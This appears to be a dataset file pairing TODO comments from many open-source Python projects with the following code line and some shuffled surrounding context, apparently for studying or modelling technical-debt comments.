# todo(py3.7): add required=true </s> p_operation = parser.add_subparsers(dest="operation", metavar="operation")	add_interact_arguments @classmethod def add_interact_arguments(cls, parser): p_convert = p_operation.add_parser( "convert", help="convert VGM to PCM using OPL hardware")
# todo results from ml </s> return str(endpoint.metadata)	_get_device_type @staticmethod def _get_device_type(endpoint):
# todo improve tests - read the output more thoroughly </s> self.assertin(	test_cloud_list_select List selected attributes of all machines ret = self.run_cloud('-f list_nodes_select virtualbox-config') BASE_BOX_NAME + ":", [i.strip() for i in ret]
'units': '1',  # todo: where does this come from??? </s> 'dtype': stat['dtype'],	create_output_files for stat in stats: measurements = [{'name': measurement, 'nodata': stat['nodata']}] filename_template = str(Path(output_dir, stat['file_path_template']))
#todo: check the data! </s> self.asserttrue(count > 0)	test_union_just_other for i in p: count += 1
# todo: copy icons into directory </s> return path	install_native_kernel_spec with open(pjoin(path, 'kernel.json'), 'w') as f: json.dump(self._native_kernel_dict, f, indent=1)
pass # todo </s> def test_get_projection(self):	test_get_projection
# todo(dcramer): deal with case when the user cannot create orgs </s> if active_organization:	get_org_redirect_url def get_org_redirect_url(request, active_organization): from sentry import features return active_organization.get_url() if not features.has('organizations:create'):
# todo(b/142684737): the multi-processing api might change. </s> beam_pipeline_args=['--direct_num_workers=%d' % direct_num_workers])	_create_pipeline metadata_connection_config=metadata.sqlite_metadata_connection_config( metadata_path),
# todo: why is this late imported </s> import pwd	chownbyname return if user: uid = pwd.getpwnam(user).pw_uid if group:
pass # todo </s> def handle_request(self, input):	handle_request
# todo: test logging messages. </s> self.manager.startup()	test_shutdown def test_shutdown(self): self.manager.shutdown() self.assertEquals(self.states, [])
a = 0 #todo wrong </s> nn.init.kaiming_normal_(layer, mode="fan_in", nonlinearity=options["gain"])	layer_initializer nn.init.kaiming_uniform_(layer, mode="fan_in", nonlinearity=options["gain"]) elif args[0] == "kaiming_normal": elif args[0] == "orthogonal": if "gain" in options:
# todo: remove when #980 has been merged </s> info['url'] = formats[-1]['url']	_real_extract 'upload_date': upload_date, } info['ext'] = determine_ext(formats[-1]['url']) return self.video_result(info)
# todo: handle agg_columns. </s> kdf = kdf[	GroupBy for i in range(groupkey_length) ] [s.rename(label) for s, label in zip(self._groupkeys, groupkey_labels)] + [kdf._kser_for(label) for label in kdf._internal.column_labels]
# todo: build url with python </s> return redirect('/admin/django_q/schedule/add/?name=system_importer_file_csv_cron_based&func=dfirtrack_main.importer.file.csv_cron_based.system')	config_check return redirect(reverse('system_list')) else:
# assume ethernet, todo: infiniband, wifi, vlan </s> values.append(['connection', 'uuid', suuid, 's'])	_add_slave_connection values = [] suuid =  str(uuid4()) values.append(['connection', 'id', slave_name, 's']) values.append(['connection', 'slave-type', slave_type, 's'])
return 0  # todo: aria2 doesn't provide this information </s> def completiontime(self):	completionTime @pyqtProperty(int, notify = initialized)
# todo check transformation to the reference element </s> x_1 = mesh.coors[:-1] + (mesh.coors[1:] - mesh.coors[:-1]) * (-nm.sqrt(1 / 2) + 1) / 2	intGauss2 @staticmethod def intGauss2(mesh, f): x_2 = mesh.coors[:-1] + (mesh.coors[1:] - mesh.coors[:-1]) * (nm.sqrt(1 / 3) + 1) / 2 w = (mesh.coors[1:] - mesh.coors[:-1]) / 2
# todo: need to cleanup the named argument mess before it is possible. </s> pass	OptimizeFunctionCallArgsVisitor pass elif star_dict_arg.isExpressionConstantRef():
# @todo: save the results for the onaccept </s> if max_kits < quantity:	inv_kit_onvalidate if kits > max_kits: max_kits = kits form.errors.quantity = T("You can only make %d kit(s) with the available stock" % int(max_kits)) return
#                assert false # todo </s> else:	execute hdf5File.close() opH5Writer.cleanUp() assert False, "Unknown export format" result[0] = not self.Dirty.value
# todo: fix with stubber / before send event </s> self.session_send_patch = mock.patch('botocore.endpoint.endpoint._send')	BaseS3OperationTest self.client = self.session.create_client( 's3', self.region) self.http_session_send_mock = self.session_send_patch.start() def tearDown(self):
# todo: move 'vote-%d.%d.%s' to settings or something </s> cookie_name = 'vote-%d.%d.%s' % (kwargs['content_type'].pk, kwargs['object_id'], kwargs['key'][:6],) # -> md5_hexdigest?	add if use_cookies: defaults['cookie'] = datetime.now().strftime('%Y%m%d%H%M%S%f') # -> md5_hexdigest? cookie = cookies.get(cookie_name) # try to get existent cookie value if not cookie:
# todo: check that the birth date is not in the future </s> if calc_check_digit(number[:-1]) != number[-1]:	validate raise InvalidLength() birth_date = get_birth_date(number) raise InvalidChecksum() return number
return -1  # todo: followup after decision around returning none </s> "cannot access _eprocess.session.sessionid at {0:#x}".format(self.vol.offset))	get_session_id vollog.log(constants.LOGLEVEL_VVV,
# todo: check error location </s> assert result.data == {'nest': none}	test_non_nullable_list_of_nullables assert len(result.errors) == 1 assert result.errors[0].message == 'Cannot return null for non-nullable type.'
# todo: test for the _correct_ revision_id value. </s> if not activity.has_key('revision_id'):	_delete_group if not activity.has_key('id'): assert False, "activity object has no id value" assert False, "activity has no revision_id value" timestamp = datetime_from_string(activity['timestamp'])
pass # todo </s> def handle_request(self, input):	handle_request
# todo(b/145514490): this is a bit heavy handed, there maybe caches where </s> self._cache = {}	CachingExecutor target_value = await cached_value.target_future except Exception as e: raise e type_utils.check_assignable_from(type_spec, target_value.type_signature)
# @todo: test </s> return self.activefitid	getActiveFit def getActiveFit(self):
# todo(soren): we need this until we can stop polling in the rpc code </s> greenthread.sleep(0.3)	test_console_output output = yield self.cloud.get_console_output(context=self.context, instance_id=[instance_id]) self.assertEquals(b64decode(output['output']), 'FAKE CONSOLE OUTPUT') rv = yield self.cloud.terminate_instances(self.context, [instance_id])
# todo: can't do this until we find a way to link with the </s> return self.dialect_impl(dialect).bind_processor(dialect)	_cached_bind_processor def _cached_bind_processor(self, dialect):
# todo: should also assert that the task is in the expected state once that's hooked up </s> assert not mock_log_event_info.called	test_handle_event_exit_early_on_misrouted_event mock_event_factory(task_id="not-the-pods-youre-looking-for", platform_type="finished") )
# todo(neuberg): this will need to be adapted against an already trained weight </s> with open(constants.output_log_path, "w") as f:	run_trainer Runs Caffe to train the model. print("\tRunning trainer...") process = subprocess.Popen([constants.CAFFE_HOME + "/build/tools/caffe", "train", "--solver=" + constants.SOLVER_FILE],
# todo: pytest.warns is not supported until pytest >= 2.8.0, whose </s> with warnings.catch_warnings(record=true) as ws:	test_wait_for_worker_idle container.start() max_workers = DEFAULT_MAX_WORKERS warnings.simplefilter('always') wait_for_worker_idle(container)
# todo: determine if this puts the case properties in the expected order. </s> case_properties={	handle case_name=hidden_value_path, case_type='task', 'task_responsible': '/data/task_responsible', 'task_due': '/data/task_due',
# todo a more reliable way of getting the windows location </s> cudnn_checkfile = os.path.join(self.env.cuda_path, "include", "cudnn.h")	cudnn_checkfiles_windows def cudnn_checkfiles_windows(self): return [cudnn_checkfile]
# todo: add option for attentive reader </s> print('trainable variables (only embeddings): %d' % get_total_trainable_variables())	boe_support_cands_reader_model varscope.reuse_variables() candidates_embedded = nvocab(candidates) question_encoding = tf.reduce_sum(question_embedded, 1, keep_dims=True) candidate_encoding = tf.expand_dims(candidates_embedded, 2)
# todo: do the computation without the 'sr' enforcement </s> mat_self = matrix(	__invert__ chart = self._domain._def_chart #!# to be improved try: [[self.comp(frame)[i, j, chart].expr(method='SR') for j in range(si, nsi)] for i in range(si, nsi)])
# todo(jheek): consider re-introducing the tracer check </s> return max_level	_level_of_value xs = jax.tree_leaves(xs) max_level = float('-inf')
# todo implement through browser </s> step_message = 'accept alert'	accept_alert def accept_alert(): execution.logger.info(step_message) _capture_or_add_step(step_message, execution.settings['screenshot_on_step'])
assert value == '' or value.isdigit(), 'bad call'  # todo remove assertion </s> set_session_view_value(view, 'motion_count', value)	set_motion_count def set_motion_count(view, value: str) -> None:
# todo: add the rest of the api actions here and call them directly from the api controller </s> self.shareable_service = sharable.shareableservice(self.manager, self.serializer)	__init__ self.serializer = VisualizationSerializer(app)
# todo: test on linux, assuming same as macos right now </s> pass	hideWindow pass elif sys.platform == 'linux': else: print("Warning: Unhandled sys.platform: ", sys.platform)
# (@todo: add a js i18n formatter for the tooltips) </s> represent = row["_row"][fieldname]	get_location_data represent = row["_row"][fieldname] elif ftype in ("double", "float"): else: represent = s3_unicode(represent)
@jtu.skip_on_devices("tpu")  # todo(phawkins): re-enable </s> def testbeta(self, a, b, dtype):	testBeta for b in [0.2, 5.] for dtype in [onp.float32, onp.float64])) key = random.PRNGKey(0) rand = lambda key, a, b: random.beta(key, a, b, (10000,), dtype)
#! todo: this needs to be made more intelligent </s> if (omega == none):	nyquist def nyquist(sys, omega=None): omega = sp.logspace(-2, 2); mag, phase, omega = sys.freqresp(omega)
annot.annotation_metadata.validation_and_reliability = "todo" #todo </s> annot.annotation_metadata.origin = metadata[1]	fill_annotation annot.annotation_metadata.annotation_tools = "Sonic Visualizer" annot.annotation_metadata.annotation_rules = "TODO" #TODO annot.annotation_metadata.annotator.name = metadata[annotation_id + 2] annot.annotation_metadata.annotator.email = "TODO" #TODO
# todo: common crud method </s> group = await self.middleware.call('datastore.query', 'account.bsdgroups', [('id', '=', pk)], {'prefix': 'bsdgrp_'})	GroupService ) async def do_update(self, pk, data): if not group: raise ValidationError(None, f'Group {pk} does not exist', errno.ENOENT)
# todo(b/110096942): more efficient gather </s> return _xla_shard(c.getshape(x), x)	xla_shard None, dims[1:])
# todo(jflesch): i18n/l10n </s> msg = "python-imaging-sane not found. scanning will be disabled."	_find_scanner self.device = None if not HAS_SANE: dialog = gtk.MessageDialog(parent = None, flags = gtk.DIALOG_MODAL,
# @todo: threadpool().map() </s> non_local_pkgs = find_missing_deps_for_aur_pkg(	find_aur_deps not_found_local_pkgs: List[str] = [] for aur_pkg_name, deps_for_aur_package in all_deps_for_aur_packages.items(): aur_pkg_name=aur_pkg_name, aur_pkgs_info=aur_pkgs_info,
# todoc: i have no clue what this is doing </s> addr = b''.join((chr(int(addr[x*2:x*2+2], 16)) for x in range(0,6)))	EthAddr else: addr = ''.join(["%02x" % (int(x,16),) for x in addr.split(":")]) elif len(addr) == 6: pass
# todo curves </s> if not preservetopology:	specializeCommands if op != 'rrcurveto': continue for i in range(len(commands)-1, -1, -1): op, args = commands[i]
# todo @chris ... </s> weight is a float	fsa_for_label_seq label_idx >= 0 and label_idx < num_labels  --or-- label_idx == num_labels for blank symbol
# todo: posts_per_year is global, kill it </s> for year, posts in posts_per_year.items():	gen_task_render_archive messages template_name = "list.tmpl" for lang in kw["translations"]: output_name = os.path.join(
# todo: update user icon on button to user avatar </s> pass	setPavloviaUser def setPavloviaUser(self, user):
# todo ??? other type of cases </s> def test_check_version_fail():	test_check_version_fail for version in [ '1',
# todo: log exception </s> value = str_entry[1].encode('ascii', errors='ignore')	_get_version_info value = str_entry[1].encode('ascii') except Exception as e: results[str_entry[0]] = value[:255]
# todo: should export bytesio as stringio in libcloud.utils.py3 </s> if py3:	_decompress_response body = zlib.decompress(body) elif encoding in ['gzip', 'x-gzip']: from io import BytesIO cls = BytesIO
# todo delay </s> async_find_and_attach(upload._id)	vscan_upload name, ) response_data = {} response_data['result'] = 'success'
"size": 50  # todo: support pagination. </s> }	search }, "fields": ["title", "project", "version", "path"], if project_slug: project = get_object_or_404(Project, slug=project_slug)
# todo remove backwards compatability patch in version 2.0 </s> if build_version < 11000:	_init_backwards_compat_patches preferences = sublime.load_settings('Preferences.sublime-settings') build_version = int(preferences.get('neovintageous_build_version', 0)) preferences.set('vintageous_use_ctrl_keys', preferences.get('vintageous_use_ctrl_keys')) preferences.set('vintageous_use_super_keys', preferences.get('vintageous_use_super_keys'))
# todo: use ctx.send_help() once pr #519 is merged. </s> help_command = await self.get_help_command(command)	ErrorHandler 10. Otherwise, handling is deferred to `handle_unexpected_error` command = ctx.command if hasattr(e, "handled"): log.trace(f"Command {command} had its error already handled locally; ignoring.")
# todo: if an attachment is filtered, the score is not complete </s> attachments = mailattachments(greedy_data["attachments"][2])	_search_phishing urls_body = greedy_data["urls-handler-body"][2] urls_attachments = greedy_data["urls-handler-attachments"][2] urls = ( (urls_body, 'urls_body'),
# todo simplify </s> print('training random_forest_regression')	random_forest_regression def random_forest_regression(self): trained_model = self._dsm.random_forest_regressor(trees=200, scoring_metric='roc_auc', randomized_search=True) self.print_metrics(trained_model)
# todo: add 3ph sgens </s> stor = net["storage"]	_get_p_q_results_opf b = hstack([b, sg["bus"].values]) net["res_sgen"].index = net["sgen"].index if len(stor) > 0: stor_is = _is_elements["storage"]
# todo ensure that if you try to filter on an invalid field, it returns a useful error. </s> try:	query_params_to_odm_query for key, value in fields_dict.items() if self.is_filterable_field(key, value) ] query = functools.reduce(intersect, query_parts) except TypeError:
# todo: move the inside snippets to the corresponding snippets dict </s> if '()' in value:	make_template colon = '' property_ = align_prefix(args['property-name'], not disable_prefixes) if value.replace('()', '') in ['rotate','rotateX','rotateY','rotateZ','skew','skewX','skewY']: value = value.replace('()', '($1${1/^((?!0$)-?(\d*.)?\d+)?.*$/(?1:deg)/m})')
# todo: this is temporary until the function argument list is refactored to work with kwargs only. </s> self.paths.append((zip(lats, lngs), {	plot kwargs.setdefault("color", color) kwargs.setdefault("c", c) 'color': _get_value(kwargs, ['color', 'c', 'edge_color', 'ec'], '#000000'), 'edge_alpha': _get_value(kwargs, ['alpha', 'edge_alpha', 'ea'], 1.0),
## slightly different api - todo test if this works </s> self[...].setlinearfactor( {x:x, y:y, z:z} )	setLinearFactor with javascript:
# todo(dcramer): ideally we could just send the signal to the subprocess </s> self.task.status = taskstatus.failed	_timeout self._logthread.terminate() logging.error('Task(id=%s) exceeded time limit of %ds', self.task.id, self.timeout) self.task.date_finished = datetime.utcnow() db.session.add(self.task)
# todo: for now, circumnavigate the detached head issue. </s> for subds in source.get_dataset_handles(recursive=true):	test_update_simple def test_update_simple(origin, src_path, dst_path): source = install(path=src_path, source=origin, recursive=True) AnnexRepo(opj(src_path, subds), init=True, create=False).git_checkout("master") source.repo.git_remote_remove("origin")
# todo(b/184055743): once tensorflow is released with </s> }	test3dSparseWithTFXIO name: "x$sparse_indices_1" type: INT feature { name: "x$sparse_values"
raise notimplementederror # todo </s> def remove(self, item):	remove
# todo: adjust edges </s> xx, yy = self._get_meshgrid(xmin, xmax, ymin, ymax)	_plot_decision ymin = y.min() ymax = y.max() Xfull = np.c_[xx.ravel(), yy.ravel()] Xfull = self._maybe_inverse(Xfull)
if not config.testnet:  # todo </s> return	parse def parse (db, tx, message): try: gasprice, startgas, endowment = struct.unpack(FORMAT, message[:LENGTH])
pass  # todo </s> def _find_device(self):	_find_device
# todo add something like this in the future, its cleaner than the </s> return names	_sub_modules_dict for module_loader, name, is_pkg in mods: names[name] = SubModuleName(self, name)
# todo support multiple backends </s> return self.backends[0].stored_playlists.delete(playlist).get()	delete :param playlist: the playlist to delete :type playlist: :class:`mopidy.models.Playlist`
### todo put memozation here </s> if file_exists(out_dir + "rapidx.jfhash"):	rapmap_pseudoindex gtf_fa = sailfish._create_combined_fasta(data, out_dir) tmpdir = dd.get_tmp_dir(data) return out_dir with file_transaction(out_dir) as tx_out_dir:
#set limit to 25 --> currently hardcoded --> todo: add a setting for this ? </s> subelement(root, "limit").text = "25"	addVideoNodesForTag SubElement(Rule, "value").text = tagname SubElement(root, "order", {"direction":"descending"}).text = "dateadded" Rule2 = SubElement(root, "rule", {"field":"playcount","operator":"is"}) SubElement(Rule2, "value").text = "0"
# todo: the defs should be util or elsewhere... </s> def vector(atm1, atm2):	vector return atm1 - atm2
# todo: context manager </s> h = csv.writer(open(filename, 'w'))	export_ships :param companion_data: Data from which to generate the ship list :param filename: The target file h.writerow(['Id', 'Ship', 'Name', 'System', 'Station', 'Value']) for thing in ships(companion_data):
# todo: disconnect </s> return	Node ) await stream.reset() if resp_code != ResponseCode.SUCCESS: error_msg = f"resp_code={resp_code}, error_msg={hello_other_side}"
walk_related=false,  # todo i'm not sure what this should be </s> )],	get_prescription_case_structure related_type='episode',
# todo: i am not at all sure why we need to </s> comp._autodisjuncts.construct()	_DisjunctionData unique_component_name(b, comp.local_name + "_disjuncts"), comp._autodisjuncts ) disjunct = comp._autodisjuncts[len(comp._autodisjuncts)] disjunct.constraint = c = ConstraintList()
# todo: only do this if needed (depending on the storage backend the whole file will be downloaded) </s> try:	save elif issubclass(self.__class__, File): self._file_type_plugin_name = self.__class__.__name__ self._file_size = self.file.size except:
# todo: remove this logging statement when all other todos </s> logger.error("in apply, join is not fully implemented")	apply game["State"] = 'P1-NEXT' store[self._name] = game elif self._action == 'FIRE':
#@todo: remove in 0.4.10 </s> def initperiodical(self):	initPeriodical pass
# todo consolidate this and pr plotter into 1 function </s> colors = ['b', 'g', 'r', 'c', 'm', 'y', 'k']	pr_plot_from_predictions def pr_plot_from_predictions(y_test, y_predictions_by_model, save=False, debug=False): plt.figure() plt.xlabel('Recall')
# todo: need to add counter </s> return true	send_media if super(self.__class__, self).sendDirectItem('media_share', user_ids, text=text, thread=thread_id, media_type=media.get('media_type'), media_id=media.get('id')): self.logger.info("Message to {user_ids} wasn't sended".format(user_ids=user_ids)) return False
# todo: add highlighting line </s> return	mouseDoubleClickEvent new_line = self._lines.index(new_line[0]) self.verticalScrollBar().setValue(new_line) except IndexError: pass
return  # todo return placeholder "[unavailable]" track? </s> return models.ref.track(uri=sp_track.link.uri, name=sp_track.name)	to_track_ref return  # TODO Return placeholder "[error]" track? if sp_track.availability != spotify.TrackAvailability.AVAILABLE:
# todo use libssl if available </s> cdn_aes = pyaes.aesmodeofoperationctr(	_prepare_cdn_redirect def _prepare_cdn_redirect(self, cdn_redirect, offset, part_size): cdn_redirect.encryption_key )
# for ~otheruser/src.  todo: should this be cached? </s> name = token.val[1:]	GetHomeDir def GetHomeDir(token): try: e = pwd.getpwnam(name)
# todo model? </s> cut_result_json = os.path.join(data_home, "cut_result.json")	classify limit: int = None, ): res = None stable = None
# logger ..." todo: this should be done before plugins discovery </s> for directory in config.config_dir, config.work_dir:	main2 displayer = display_util.NcursesDisplay() zope.component.provideUtility(displayer) le_util.make_or_verify_dir( directory, constants.CONFIG_DIRS_MODE, os.geteuid())
# todo ... </s> data = sorted()	userLongDescription for key in mainKeys: data[key] = data.get(key, "").strip()
# todo actions may contain wildcards, e.g. sts:* -- this can be solved by using policyuniverse to </s> if action == "sts:assumerole":	load_group_policies if not action: continue if statement["Effect"] == "Allow": role_arns = statement["Resource"]
# todo: this is a jump. </s> vi_cmd_data['motion']['command'] = '_vi_forward_slash'	vi_forward_slash def vi_forward_slash(vi_cmd_data): vi_cmd_data['motion']['args'] = {'mode': vi_cmd_data['mode'], 'count': vi_cmd_data['count'], 'search_string': vi_cmd_data['user_motion_input']} vi_cmd_data['count'] = 1
# todo: set file creation mask to 640 </s> shutil.copyfile(upsshed_conf_template, upssched_conf)	config_upssched versions. Set owner.group and permissions to originals. upsshed_conf_template = ('%s/upssched.conf' % settings.CONFROOT) run_command([CHOWN, 'root.nut', UPSSCHED_CONF]) run_command([CHMOD, '640', UPSSCHED_CONF])
# todo: add logging </s> pass	parse_clip_path_even_odd def parse_clip_path_even_odd(self, token='W*', params=''):
#todo(#212): use a map construct instead of unrolling. </s> source = batching.move_dim_to_front(source, s_bdims)	select_and_scatter_add_batch_rule s_bdims, o_bdims = batch_dims if s_bdims is not None and o_bdims is not None: operand = batching.move_dim_to_front(operand, o_bdims) outputs = [
# todo: why is this failing? </s> async def test_v2_locations_id(self, mock_datetime):	FlaskRoutesTest with open(filepath, "r") as file: expected_json_output = file.read() mock_datetime.utcnow.return_value.isoformat.return_value = DATETIME_STRING mock_datetime.strptime.side_effect = mocked_strptime_isoformat
raise skiptest("broken test")  # todo(mattjj): fix </s> if not config.omnistaging_enabled:	test_random_split_doesnt_device_put_during_tracing def test_random_split_doesnt_device_put_during_tracing(self): raise SkipTest("test is omnistaging-specific") key = random.PRNGKey(1)
# todo(andym): delete once personas migration is live. </s> assert pq(r.content)('h4.author').text().startswith('by regularuser')	test_by r = self.client.get(self.url)
return skiptest("test doesn't pass yet")  # todo(frostig) </s> def fun(x):	testAddBroadcasting def testAddBroadcasting(self): return x + 3 x = onp.array([[1, 2], [3, 4]])
# todo add switch to make tarball/zip </s> type='directory',	dlplugin status='ok', path=output, action='bids2scidata', logger=lgr)
# todo: i think this should use '$ fileregions' </s> return self.id1.segments[0].bounds.start	FirstSeg def FirstSeg(self):
# todo: test bytearray </s> if not isinstance(prefix, (bytes, bytearray)):	Key versionbyte = self.network.prefix_wif else: versionbyte = binascii.unhexlify(prefix) else:
# todo: same as above, what if there's no splitfrac </s> svals.append(value(mem * sf))	tear_diff_direct for name, mem in src.iter_vars(names=True): if src.is_extensive(name) and sf is not None: else: svals.append(value(mem))
# todo: remove when #980 has been merged </s> info['url'] = formats[-1]['url']	_real_extract 'upload_date': upload_date, } info['ext'] = determine_ext(formats[-1]['url']) return self.video_result(info)
# todo: refactor linodeexception, args[0] should be error_id </s> if e.args[0] == 5:	delete_record data = self.connection.request(API_ROOT, params=params).objects[0] except LinodeException, e: raise RecordDoesNotExistError(value='', driver=self, record_id=record.id)
blockchain.connect()  # todo: leave this here? </s> payload.update(dict(blockchain=blockchain))	from_configuration_file blockchain_payload = payload.pop('blockchain') blockchain = BlockchainInterface.from_dict(payload=blockchain_payload) payload.update(overrides) instance = cls(filepath=filepath, **payload)
# todo support for keccack </s> key = _standardize_path(path)	compile_from_input_dict interface_sources: ContractCodes = {} for path, value in input_dict.get('interfaces', {}).items(): interface_sources[key] = value['content'] output_formats = {}
# todo: parallelize this loop </s> for block_start in block_starts:	_transferData block_starts = BlockwiseFileset.getIntersectingBlocks(self.description.block_shape, roi) entire_dataset_roi = ([0] *len(self.description.shape), self.description.shape) entire_block_roi = ( block_start, block_start + block_shape ) entire_block_roi = getIntersection( entire_block_roi, entire_dataset_roi )
# todo: handle "other" </s> other=[]	Sequence domain_architecture=get_child_as(elem, 'domain_architecture', DomainArchitecture), ) @classmethod
# todo: remove this logging statement when all other todos </s> logger.error("in apply, fire is not fully implemented")	apply elif game['State'] == 'P2-NEXT': game['State'] = 'P1-NEXT' store[self._name] = game else:
# todo _cphttptools.applyfilterlist('afterrequestbody') </s> _cphttptools.dorequest(self.wfile)	do_POST if cpg.request.parsePostData: _cphttptools.parsePostData(self.rfile)
#ack = self.serialport.read() # todo: use ack </s> self.sendcommand(129) # 10000001	disable def disable(self):
# todo: connect to agent code </s> print('set advice: ' + self.advicebox.toplaintext())	setAdvice def setAdvice(self):
# todo: may test file contents </s> temp = tempfile.namedtemporaryfile(delete=false)	test_export_to_csv_filename def test_export_to_csv_filename(self): self.files_to_delete.append(temp.name) rows.export_to_csv(utils.table, temp.name)
percentiles_to_calculate = range(0, 100, 1)  # todo: get input from user </s> headers = constants.submetric_header + ',mean,std,p50,p75,p90,p95,p99,min,max\n'  # todo: this will be built from user input later on	calculate_other_metric_stats def calculate_other_metric_stats(self): stats_to_calculate = ['mean', 'std', 'min', 'max']  # TODO: get input from user metric_stats_csv_file = self.get_stats_csv() imp_metric_stats_csv_file = self.get_important_sub_metrics_csv()
# todo: earlier warning in conf check ? </s> logger.warning('inventory source slug %s exists already', key)	EventMetadata key = slugify(source.name) if key in ms_d: machine_d[key] = ms_d if machine_d:
# todo: move this wrapping logic into a common templatetag. </s> for i in range(0, len(base64), 64):	get_public_key if key: base64 = key.get_base64() public_key += base64[i:i + 64] + '\n' return public_key
# todo: if clang will be extended with an extra analyzer option in </s> flags_with_path = ['-i', '-idirafter', '-iquote', '-isysroot', '-isystem',	__collect_transform_include_opts next(flag_iterator) param = flag_iterator.item '-sysroot', '--sysroot'] if flag in flags_with_path and ('sysroot' in flag or param[0] != '='):
# todo -- can we do this without a subscription? </s> if not api.use_store:	play_different_album @ask.intent("GeeMusicPlayDifferentAlbumIntent") def play_different_album(): return statement(render_template("not_supported_without_store")) api = GMusicWrapper.generate_api()
# todo make sure this works </s> log("creating lights...", 'info')	buildModelFromDictionary else: log("  No kinematic chains in model.", 'INFO') if 'lights' in model and model['lights']: for light in model['lights']:
# todo: add some unit tests for this. </s> return context	create context.push(kwargs)
# todo: add support for composite primary keys. </s> self.id_column = model._meta.primary_key	__init__ self.id_column = model._meta.fields[resource.meta.id_field] else: if not hasattr(resource.Meta, 'name'): meta['name'] = model._meta.db_table.lower()
# todo: what about alpha (rgba)? </s> output_type = pyluxcore.filmoutputtype.rgb_imagepipeline	draw refresh_denoised = (time() - self.last_denoiser_refresh) > scene.luxcore.denoiser.refresh_interval if refresh_denoised: was_paused = session.IsInPause() if not was_paused:
# todo: skipped due to gh-4436 </s> yield skip_if_on_windows(skip_ssh(_test_create_store)), 'datalad-test'	test_create_simple def test_create_simple(): yield _test_create_store, None
# todo(anjalisridhar): you can pass test name and sample type when creating </s> def __init__(self):	MnistMlpBenchmark class MnistMlpBenchmark(BenchmarkModel): self._test_name = "mnist_mlp" self._sample_type="images"
# todo: decouple code generator. perhaps allow  pydy and/or pyodesys </s> self.output_equation_function = lambdify_with_vector_args( \	output_equations else: assert find_dynamicsymbols(output_equations) <= set(self.inputs) [dynamicsymbols._t] + sp.flatten(self.inputs), \ output_equations.subs(self.constants_values), modules="numpy")
pass # todo </s> def handle_request(self, input):	handle_request
setattr(model, "require_backward_grad_sync", false)  # todo: needed? </s> return [model], optimizers	_setup_models_and_optimizers optimizers = self._wrap_optimizers(optimizers) model = ShardedDataParallel(models[0], sharded_optimizer=optimizers, **self._ddp_kwargs)
# todo fix. </s> self.assertequals(reil_ctx_out["xmm0"], res)	test_pcmpeqb res = 0x000000ff0000ff00ff00000000ffff00 x86_ctx_out, reil_ctx_out = self.__run_code(asm, 0xdeadbeef, ctx_init) self.assertEquals(reil_ctx_out["xmm1"], ctx_init["xmm1"])
# todo remove? </s> yield key_stmt[0].name, value_stmt	iterate yield call.name, value_stmt else: else: if stmt.assignment_details:
# todo: if empty, add 'pass' </s> except:	align_deparse_code if deparsed.ast[-1] == RETURN_NONE: deparsed.ast.pop() # remove last node pass deparsed.gen_source(deparsed.ast, co.co_name, customize)
# todo: switch _ignore_connection_reset for _ignore_transmission_error, or provide retry mechanism </s> if self._ignore_connection_reset:	transmit self.last_send = data except sex.BoofuzzTargetConnectionReset: self._fuzz_data_logger.log_info("Target connection reset.") else:
match_mode = datawalker.repeat  # todo should be determined by modes of input walkers </s> result_data = listtreegenerator(out_list)	walk_data def walk_data(*walkers, out_list): max_value_len = max(w.next_values_number for w in walkers) [w.step_down_matching(max_value_len, match_mode) for w in walkers]
# todo: do we require graphs with no nodes/edges to have the same schema?  currently </s> ret_feat = _batch_feat_dicts(frames, edata, 'edges[{}].data'.format(etype))	batch g._edge_frames[etype_id] for g in graphs if g._graph.number_of_edges(etype_id) > 0] retg.edges[etype].data.update(ret_feat) return retg
# todo: support aa </s> aa = [[]  for _ in lengths]	split else: ah = [[] for _ in lengths] assert len(lh) == len(po) == len(ah) == len(aa) all_args = zip(lh, po, ah, aa)
# todo : documentation pending </s> if not isinstance(variables, list):	tf_variables_to_numpy def tf_variables_to_numpy(variables, sess=None): var_list = [variables] else:
# todo: implement </s> record0.write('\xff' * 4)	_generate_record0 0xe8, 2, 65001, uid, 6)) record0.write('\xff' * 8) record0.write('\xff' * 28) record0.write(pack('>I',
# todo ... </s> self.error("preprocessor: if-evaluation not yet implemented; cannot check '" + condstr + "'")	cpreprocess_evaluate_cond def cpreprocess_evaluate_cond(state, condstr): return True # may be more often what we want :P
#todo classes broken </s> sample = self.sess.run(generator, feed_dict={})	sample_batch y_t = get_tensor("y") print("generator is ", generator) print("sample is ", sample) print(sample.shape)
#todo: add way to check if alt is pressed </s> self.currenttool.mirror(blocksonly=true)	key_down self.currentTool.rotate(blocksOnly=True) elif keyname == config.config.get('Keys', 'Mirror'): elif keyname == config.config.get('Keys', 'Flip'): self.currentTool.flip(blocksOnly=False)
# todo: shouldn't it take place only on paste? </s> concrete_index = self.index(index)	direct_insert def direct_insert(self, index, chars, tags=None, **kw): line_before = self.get(concrete_index + " linestart", concrete_index + " lineend") self._last_event_changed_line_count = "\n" in chars
# todo: test the size when the field is new </s> self.assertequal(self.rt2.get_header_size(),32)	test_08_flags_field self.assertEqual(self.rt2.get_size(),len(self.frame_orig_2))
raise notimplementederror #todo, implement! </s> def testclass(cls):	testclass
# todo this is not tested yet. </s> print 'not tested'	cequantile def cequantile(t, a, b, p): L = np.power((t+.0)/ a,b) quantile = a * np.power(-np.log(1. - p) - L,1. / b)
#todo: call _update_node_parents and _update_node_rule_for_parents </s> nx.digraph.add_edges_from(self, ebunch)	add_edges_from raise TypeError("Name of nodes must be strings")
# todo(b/130724878): these conversions should not be needed. </s> return cls(	from_anon_tuple @classmethod def from_anon_tuple(cls, anon_tuple, round_num): model=anon_tuple.model._asdict(recursive=True), optimizer_state=list(anon_tuple.optimizer_state),
pass # todo </s> def try_undo(self, *args):	try_undo
# todo generator </s> handle_dirty_dataset(ds, mode=if_dirty)	__call__ for ds_path in content_by_ds: ds = Dataset(ds_path) content = [ap['path'] for ap in content_by_ds[ds_path] if ap.get('type', None) != 'dataset' or ap['path'] == ds.path]
# todo(skeen): think of a better solution </s> if not addon.privacy_policy:	privacy def privacy(request, addon_id): addon = get_object_or_404(Addon.objects.valid(), id=addon_id) return http.HttpResponsePermanentRedirect(reverse( 'addons.detail', args=[addon.id]))
assert oldsize == self.size, '%s: %d, %d' % (self.type, oldsize, self.size) # todo: remove </s> return self.size	Atom else: self.size = 8 + sum([atom.calsize() for atom in self.body])
# todo: disconnect </s> raise handshakefailure(error_msg)	Node self.logger.info(f"Handshake failed: {error_msg}") await stream.reset() self.handshaked_peers.add(peer_id) self.logger.debug(f"Handshake to {peer_id} is finished. Added to the `handshake_peers`.")
